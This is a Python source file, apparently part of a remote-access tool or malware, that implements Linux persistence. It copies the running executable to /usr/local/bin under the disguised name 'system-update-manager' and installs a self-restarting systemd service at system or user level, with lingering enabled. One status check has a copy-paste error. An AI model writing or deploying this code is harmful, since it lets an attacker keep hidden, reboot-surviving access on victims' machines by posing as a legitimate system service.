import os
import sys
import shutil
import subprocess
import logging
from pathlib import Path

class LinuxPersistence:
    def __init__(self, service_name=None, exec_path=None, description="System Service"):
        self.service_name = service_name or "system-update-manager"
        self.exec_path = exec_path or sys.executable
        self.description = description
        self.service_content = self._generate_service_file()
        self.installed = False
        self.logger = self._setup_logging()

    
    def _setup_logging(self):
        logging.basicConfig(
            level = logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

        return logging.getLogger(__name__)
    
    

    def _generate_service_file(self):
        if getattr(sys, "frozen", False):
            exec_path = os.path.abspath(sys.argv[0])
            c_dir = os.path.dirname(exec_path)
        else:
            exec_path = sys.executable
            c_dir = os.path.dirname(os.path.abspath(__file__))
        #client_script = os.path.join(c_dir, "client.py")

        return f"""[Unit]
Description={self.description}
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart={exec_path}
Restart=always
RestartSec=10
WorkingDirectory={c_dir}
Environment=HOME={c_dir}
Environment=USER={os.getenv('USER')}
Environment=DISPLAY=0
Environment=DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/{os.getuid()}/bus
StandardOutput=journal
StandardError=journal
SyslogIdentifier={self.service_name}

[Install]
WantedBy=default.target
"""



    def copy_to_system_loc(self):
        try:
            system_locs = [
                "/usr/sbin",
                "/usr/local/bin",
                "/opt/system/",
                "/var/lib/"
            ]


            target_dir = system_locs[1]
            target_path = os.path.join(target_dir, self.service_name)

            os.makedirs(target_dir, exist_ok=True)


            shutil.copy2(self.exec_path, target_path)

            os.chmod(target_path, 0o755)


            self.logger.info(f"Copied executable to : {target_path}")
            return target_path

        except Exception as e:
            self.logger.error(f"Failed to copy to system location : {e}")

            return self.exec_path
    


    def install_system_service(self):
        try:

            if os.geteuid() != 0:
                self.logger.error("Root privileges required for system service installation")
                return False
            

            persistent_path = self.copy_to_system_loc()
            service_file = f"/etc/systemd/system/{self.service_name}.service"


            with open(service_file, "w") as f:
                f.write(self.service_content)
            


            subprocess.run(['systemctl', "daemon-reload"], check=True)
            subprocess.run(["systemctl", 'enable', self.service_name], check=True)
            subprocess.run(['systemctl', 'start', self.service_name], check=True)


            self.installed = True

            self.logger.info(f"System service installed : {self.service_name}")
            return True
        

        except subprocess.CalledProcessError as e:
            self.logger.error(f"Systemd command failed: {e}")
            
            return False
        
        except Exception as e:
            self.logger.error(f"Service installation failed: {e}")

            return False
        
    

    def install_user_service(self):
        try:
            user_service_dir = os.path.expanduser("~/.config/systemd/user/")
            os.makedirs(user_service_dir, exist_ok=True)

            service_file = os.path.join(user_service_dir, f"{self.service_name}.service")


            with open(service_file, "w") as f:
                f.write(self.service_content)
            
            os.chmod(user_service_dir, 0o755)
            os.chmod(service_file, 0o644)
            
            subprocess.run(['systemctl', '--user', 'daemon-reload'], check=True)
            subprocess.run(['systemctl', '--user', 'enable', self.service_name], check=True)
            subprocess.run(['systemctl', '--user', 'start', self.service_name], check=True)
            subprocess.run(['loginctl', 'enable-linger'], check=True)


            self.installed = True
            self.logger.info(f"User service installed: {self.service_name}")

            return True
        
        except Exception as e:
            self.logger.error(f"User service installation failed: {e}")
            
            return False
    



    def install_persistence(self, user_level=False):
        if user_level:
            return self.install_user_service()
        else:
            return self.install_system_service()



    def check_persistence(self, user_level=False):
        try:
            if user_level:
                result = subprocess.run(
                    ["systemctl", "--user", 'is-active', self.service_name],
                    capture_output=True, 
                    text=True
                )
                active = result.returncode == 0

                result = subprocess.run(
                    ['systemctl', '--user', "is-enabled", self.service_name],
                    capture_output=True,
                    text=True
                )
                enabled = result.returncode == 0

            
            else:
                result = subprocess.run(
                    ['systemctl', 'is-active', self.service_name],
                    capture_output=True,
                    text=True
                )
                active = result.returncode == 0

                result = subprocess.run(
                    ["systemctl", 'is-active', self.service_name],
                    capture_output=True,
                    text=True
                )
                enabled = result.returncode == 0
            

            return active and enabled




        except Exception as e:
            self.logger.error(f"Service check failed: {e}")

            return False
    
    

    def get_service_status(self, user_level=False):
        try:
            if user_level:
                result = subprocess.run(
                    ['systemctl', '--user', 'status', self.service_name],
                    capture_output=True, 
                    text=True
                )
            
            
            else:
                result = subprocess.run(
                    ['systemctl', 'status', self.service_name],
                    capture_output=True,
                    text=True
                )
            

            return result.stdout
        

        except Exception as e:
            return f'Status check failed: {e}'

